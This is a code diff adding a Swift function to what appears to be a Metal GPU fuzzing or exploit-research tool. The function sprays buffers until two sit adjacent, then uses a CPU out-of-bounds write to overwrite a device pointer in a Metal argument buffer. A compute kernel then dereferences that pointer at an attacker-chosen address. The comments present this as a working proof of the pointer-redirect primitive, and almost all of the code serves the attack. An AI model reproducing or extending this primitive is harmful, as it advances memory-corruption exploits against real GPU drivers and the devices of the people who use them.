@@ -3019,3 +3019,147 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
         completion()
     })
 }
+
+// ── runArgBufCorrupt ─────────────────────────────────────────────────────────
+// GPU pointer redirect via CPU OOB write into a Metal argument buffer.
+//
+// Primitive demonstrated:
+//   lo.contents()+BUF_LEN  (CPU OOB write)
+//     → hi.contents()[0]   (overwrites device-ptr field in argument buffer)
+//     → GPU kernel dereferences hi[0] as a raw GPU VA
+//     → GPU page-faults at attacker-controlled address
+//
+// This is the clean end-to-end proof:
+//   CPU OOB write  →  GPU VA redirect  →  controlled GPU page fault
+// ─────────────────────────────────────────────────────────────────────────────
+func runArgBufCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── ArgBuf GPU Ptr Corrupt ──")
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        let BUF_LEN = 4096
+        let canaryVA: UInt64 = 0xDEAD_C0DE_CAFE_0000
+
+        // sentinelBuf: filled 0xBB — GPU reads from here in the valid baseline case
+        guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let resultBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ sentinel/result alloc"); completion(); return
+        }
+        sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
+        resultBuf.contents().initializeMemory(as: UInt8.self, repeating: 0, count: BUF_LEN)
+        let sentVA = sentinelBuf.gpuAddress
+        step("sentinelBuf VA=0x\(String(sentVA, radix: 16))")
+
+        // Spray: find lo with lo.gpuAddress + BUF_LEN = nextGPUVA (adjacent GPU VA slot)
+        var loRef: MTLBuffer?
+        var nextGPUVA: UInt64 = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef = prev; nextGPUVA = a.gpuAddress; break
+            }
+            keepAlives.append(a)
+        }
+        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16)) nextGPUVA=0x\(String(nextGPUVA, radix: 16))")
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+
+        // hi: argument buffer allocated immediately after lo → should land at nextGPUVA
+        // hi[0..7] = device float4* pointer that the compute kernel will dereference
+        guard let hi = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ hi alloc"); completion(); return
+        }
+        let hiVA = hi.gpuAddress
+        step("hi gpuVA=0x\(String(hiVA, radix: 16)) \(hiVA == nextGPUVA ? "✓ at nextGPUVA" : "⚠ MISMATCH (not at nextGPUVA)")")
+        let hiPtr = hi.contents().assumingMemoryBound(to: UInt8.self)
+
+        // OOB helpers — lo.contents()+BUF_LEN reaches hi.contents() in CPU VA space
+        func oobWrite8(_ off: Int, _ val: UInt64) {
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
+        }
+        func oobRead8(_ off: Int) -> UInt64 {
+            var v: UInt64 = 0
+            for bi in 0..<8 { v |= UInt64(loPtr[BUF_LEN+off+bi]) << (bi*8) }
+            return v
+        }
+
+        // Verify OOB reach: write a known value via OOB and confirm via hi.contents()
+        oobWrite8(0, 0xAAAA_BBBB_CCCC_DDDD)
+        let hiCheck = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("OOB reach check: wrote 0xAAAABBBBCCCCDDDD, hi[0]=0x\(String(hiCheck, radix: 16)) \(hiCheck == 0xAAAA_BBBB_CCCC_DDDD ? "✓ ADJACENT" : "⚠ NOT ADJACENT — CPU VA not contiguous")")
+
+        // Compute kernel: struct AB { device float4* buf; }
+        // kernel probe reads ab->buf[0] — dereferences the pointer stored in hi[0..7]
+        let src = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct AB { device float4* buf; };
+        kernel void probe(device AB* ab [[buffer(0)]],
+                          device float4* out [[buffer(1)]]) {
+            out[0] = ab->buf[0];
+        }
+        """
+        guard let lib = try? device.makeLibrary(source: src, options: nil),
+              let fn  = lib.makeFunction(name: "probe"),
+              let pso = try? device.makeComputePipelineState(function: fn) else {
+            step("✗ compute PSO failed"); completion(); return
+        }
+        step("✓ compute PSO (probe kernel) ready")
+
+        func execProbe(markSentinel: Bool) -> (Bool, String) {
+            guard let q   = device.makeCommandQueue(),
+                  let cb  = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return (false, "no encoder") }
+            enc.setComputePipelineState(pso)
+            enc.setBuffer(hi,        offset: 0, index: 0)
+            enc.setBuffer(resultBuf, offset: 0, index: 1)
+            if markSentinel { enc.useResource(sentinelBuf, usage: .read) }
+            let t = MTLSize(width: 1, height: 1, depth: 1)
+            enc.dispatchThreads(t, threadsPerThreadgroup: t)
+            enc.endEncoding()
+            cb.commit(); cb.waitUntilCompleted()
+            if let err = cb.error as NSError? {
+                return (true, "FAULT code=\(err.code) \(err.localizedDescription.prefix(100))")
+            }
+            let out = resultBuf.contents().assumingMemoryBound(to: UInt64.self)[0]
+            return (false, "✓ out[0]=0x\(String(out, radix: 16))")
+        }
+
+        // ── Step 1: baseline — write sentVA into hi[0] directly, GPU reads sentinelBuf ──
+        step("── step 1: hi[0]=sentVA direct write, GPU→sentinelBuf (baseline) ──")
+        hi.contents().assumingMemoryBound(to: UInt64.self)[0] = sentVA
+        let (f1, s1) = execProbe(markSentinel: true)
+        step("  \(s1)")
+        let sentVal = sentinelBuf.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("  sentinelBuf[0]=0x\(String(sentVal, radix: 16))")
+
+        // ── Step 2: OOB corrupt — lo OOB write puts canaryVA into hi[0] ──
+        step("── step 2: OOB lo→hi[0]=canaryVA=0x\(String(canaryVA, radix: 16)) ──")
+        oobWrite8(0, canaryVA)
+        let hiGot = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        let oobHit = hiGot == canaryVA
+        step("  hi[0] via direct read=0x\(String(hiGot, radix: 16)) \(oobHit ? "✓ OOB CONFIRMED" : "⚠ OOB MISS")")
+        let (f2, s2) = execProbe(markSentinel: false)
+        step("  \(s2)")
+        if f2 && oobHit {
+            step("  ★★★ CONTROLLED GPU FAULT: CPU OOB→hi[0]=canaryVA→GPU deref→page fault at 0x\(String(canaryVA, radix: 16))")
+        } else if !oobHit {
+            step("  ⚠ OOB miss — hi not CPU-adjacent to lo (allocator gap)")
+        }
+
+        // ── hi raw bytes at both offsets for verification ──
+        step("── lo+BUF_LEN[0..31] (OOB view of hi) ──")
+        var h = "  "
+        for i in 0..<32 { h += String(format: "%02x ", loPtr[BUF_LEN+i]) }
+        step(h)
+        step("── hi.contents()[0..31] (direct view) ──")
+        var h2 = "  "
+        for i in 0..<32 { h2 += String(format: "%02x ", hiPtr[i]) }
+        step(h2)
+
+        step("── ArgBuf GPU Ptr Corrupt complete ──")
+        completion()
+    }
+}
